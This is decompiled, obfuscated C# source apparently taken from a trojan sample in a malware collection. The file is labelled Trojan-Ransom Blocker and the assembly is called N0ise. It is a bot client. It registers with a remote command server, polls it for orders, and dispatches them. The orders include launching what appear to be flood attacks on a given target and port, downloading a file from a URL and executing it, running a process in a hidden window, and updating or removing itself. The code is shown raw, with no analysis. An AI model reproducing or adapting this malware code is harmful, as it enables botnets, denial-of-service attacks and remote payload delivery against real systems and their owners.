// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=c9120c1babe06550
// MVID: B2F891D4-C201-4F81-8299-D09EACC947CC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan-Ransom.Win32.Blocker.vmj-deff3c9c03fff36f4920a66464fdae29fc17859fa6ac5029198e6b6c0869fdd6.exe

using \u0001;
using \u0003;
using \u0004;
using \u0005;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0005
{
  internal class \u0002
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    private string \u0001 = string.Empty;

    public void \u0002()
    {
      this.\u0003();
      // ISSUE: method pointer
      Thread thread = new Thread(new ThreadStart((object) this, __methodptr(\u0004)));
      \u0012\u0002.\u007E\u0084\u0002((object) thread);
    }

    private void \u0003()
    {
      string[] strArray = new string[8]
      {
        \u0002.\u0001(892),
        \u0004.\u0004.\u0001.\u0005,
        \u0002.\u0001(909),
        \u0004.\u0004.\u0001.\u0002,
        \u0002.\u0001(922),
        \u0004.\u0004.\u0001.\u0006,
        \u0002.\u0001(935),
        \u0004.\u0004.\u0001.\u0007
      };
      string str1 = \u001E\u0003.\u0095(strArray);
      while (true)
      {
        try
        {
          string str2 = this.\u0002(\u0004.\u0004.\u0001.\u0001, str1);
          if (\u0097.\u007E\u0083((object) str2) > 0)
          {
            if (\u0083\u0003.\u0080(str2, \u0004.\u0004.\u0001.\u0004))
              break;
            \u0016\u0002.\u0006\u0002(-1);
          }
        }
        catch
        {
        }
        \u0016\u0002.\u0087\u0002(\u0004.\u0004.\u0001.\u0001 * 60 * 1000);
      }
    }

    private void \u0004()
    {
      string str1 = \u0084\u0003.\u0092(\u0002.\u0001(948), \u0004.\u0004.\u0001.\u0005);
      while (true)
      {
        try
        {
          string str2 = this.\u0002(\u0004.\u0004.\u0001.\u0001, str1);
          if (\u0097.\u007E\u0083((object) str2) > 0)
          {
            if (\u0083\u0003.\u0081(str2, this.\u0001))
            {
              this.\u0002(str2);
              this.\u0001 = str2;
            }
          }
          else
          {
            try
            {
              \u0002.\u0003();
            }
            catch
            {
            }
            try
            {
              \u0004.\u0003.\u0003();
            }
            catch
            {
            }
            try
            {
              \u0002.\u0003();
            }
            catch
            {
            }
            try
            {
              \u0003.\u0003.\u0003();
            }
            catch
            {
            }
            this.\u0001 = string.Empty;
          }
        }
        catch
        {
        }
        \u0016\u0002.\u0087\u0002(\u0004.\u0004.\u0001.\u0001 * 60 * 1000);
      }
    }

    private string \u0002([In] string obj0, [In] string obj1)
    {
      \u009F.\u0014\u0004(false);
      HttpWebRequest httpWebRequest = (HttpWebRequest) \u001C\u0002.\u0004\u0004(obj0);
      \u0084\u0002.\u007E\u0007\u0004((object) httpWebRequest, \u0002.\u0001(965));
      \u0084\u0002.\u007E\u0005\u0004((object) httpWebRequest, \u0002.\u0001(1010));
      \u0084\u0002.\u007E\u0010\u0004((object) httpWebRequest, \u0004.\u0004.\u0001.\u0004);
      byte[] numArray = \u0088\u0003.\u007E\u0007\u0003((object) \u009B\u0002.\u0006\u0003(), obj1);
      \u008D\u0002.\u007E\u0006\u0004((object) httpWebRequest, (long) numArray.Length);
      Stream stream = \u0005\u0002.\u007E\u0008\u0004((object) httpWebRequest);
      \u0004\u0003.\u007E\u001D\u0003((object) stream, numArray, 0, numArray.Length);
      \u0012\u0002.\u007E\u001A\u0003((object) stream);
      WebResponse webResponse = \u008F\u0002.\u007E\u000E\u0004((object) httpWebRequest);
      if (webResponse == null)
        return string.Empty;
      StreamReader streamReader = new StreamReader(\u0005\u0002.\u007E\u000F\u0004((object) webResponse));
      return \u008E\u0002.\u007E\u008E((object) \u008E\u0002.\u007E\u0088\u0003((object) streamReader));
    }

    private void \u0002([In] string obj0)
    {
      string[] strArray = new string[0];
      try
      {
        strArray = \u009E.\u007E\u0084((object) obj0, new char[1]
        {
          '*'
        });
      }
      catch
      {
      }
      string key;
      if ((key = strArray[0]) == null)
        return;
      if (\u0006.\u0001.\u0001 == null)
        \u0006.\u0001.\u0001 = new Dictionary<string, int>(8)
        {
          {
            \u0002.\u0001(1019),
            0
          },
          {
            \u0002.\u0001(1032),
            1
          },
          {
            \u0002.\u0001(1045),
            2
          },
          {
            \u0002.\u0001(1058),
            3
          },
          {
            \u0002.\u0001(1071),
            4
          },
          {
            \u0002.\u0001(1084),
            5
          },
          {
            \u0002.\u0001(1093),
            6
          },
          {
            \u0002.\u0001(1102),
            7
          }
        };
      int num1;
      // ISSUE: explicit non-virtual call
      if (!__nonvirtual (\u0006.\u0001.\u0001.TryGetValue(key, out num1)))
        return;
      switch (num1)
      {
        case 0:
          try
          {
            \u0002.\u0001 = \u0006\u0003.\u0004\u0002(strArray[1]);
            \u0002.\u0001 = \u001A\u0003.\u007F\u0002(strArray[2]);
            \u0002.\u0002 = \u000F\u0002.\u0002\u0002(strArray[3]);
            \u0002.\u0001 = \u000F\u0002.\u0002\u0002(strArray[4]);
            \u0002.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 1:
          try
          {
            \u0004.\u0003.\u0001 = \u0006\u0003.\u0004\u0002(strArray[1]);
            \u0004.\u0003.\u0001 = \u000F\u0002.\u0002\u0002(strArray[2]);
            \u0004.\u0003.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 2:
          try
          {
            \u0002.\u0001 = \u0006\u0003.\u0004\u0002(strArray[1]);
            \u0002.\u0001 = \u001A\u0003.\u007F\u0002(strArray[2]);
            \u0002.\u0002 = \u000F\u0002.\u0002\u0002(strArray[3]);
            \u0002.\u0003 = \u000F\u0002.\u0002\u0002(strArray[4]);
            \u0002.\u0001 = \u000F\u0002.\u0002\u0002(strArray[5]);
            \u0002.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 3:
          try
          {
            \u0003.\u0003.\u0001 = \u0006\u0003.\u0004\u0002(strArray[1]);
            \u0003.\u0003.\u0001 = \u001A\u0003.\u007F\u0002(strArray[2]);
            \u0003.\u0003.\u0003 = \u000F\u0002.\u0002\u0002(strArray[3]);
            \u0003.\u0003.\u0001 = \u000F\u0002.\u0002\u0002(strArray[4]);
            \u0003.\u0003.\u0002 = \u000F\u0002.\u0002\u0002(strArray[5]);
            \u0003.\u0003.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 4:
          try
          {
            string str = \u0084\u0003.\u0092(\u0004.\u0004.\u0001.\u0002(\u009E\u0002.\u007E\u0018\u0002((object) new Random(), 5, 12)), \u0002.\u0001(213));
            \u0010\u0003.\u0016\u0004((object) new WebClient(), \u0006\u0003.\u0004\u0002(strArray[1]), \u0082\u0003.\u0093(\u0006\u0003.\u000E\u0002(\u0002.\u0001(222)), \u0002.\u0001(231), str));
            Process process = new Process();
            \u0084\u0002.\u007E\u008E\u0004((object) \u000E\u0002.\u007E\u0081\u0004((object) process), \u0082\u0003.\u0093(\u0006\u0003.\u000E\u0002(\u0002.\u0001(222)), \u0002.\u0001(231), str));
            int num2 = \u0014\u0003.\u007E\u0086\u0004((object) process) ? 1 : 0;
            break;
          }
          catch
          {
            break;
          }
        case 5:
          try
          {
            Process process = new Process();
            \u0081\u0002.\u007E\u0082\u0004((object) process, new ProcessStartInfo(\u0006\u0003.\u0004\u0002(strArray[1])));
            \u001F\u0002.\u007E\u008F\u0004((object) \u000E\u0002.\u007E\u0081\u0004((object) process), ProcessWindowStyle.Hidden);
            int num3 = \u0014\u0003.\u007E\u0086\u0004((object) process) ? 1 : 0;
            break;
          }
          catch
          {
            break;
          }
        case 6:
          \u0004.\u0004.\u0001.\u0002(\u0006\u0003.\u0004\u0002(strArray[1]));
          break;
        case 7:
          if (!\u0083\u0003.\u0080(strArray[1], \u0086\u0003.\u0007\u0002()) && !\u0083\u0003.\u0080(\u008E\u0002.\u007E\u008D((object) strArray[1]), \u0002.\u0001(1111)))
            break;
          \u0004.\u0004.\u0001.\u0005();
          break;
      }
    }

    static \u0002() => \u0001.\u0004.\u0002(typeof (\u0002));
  }
}
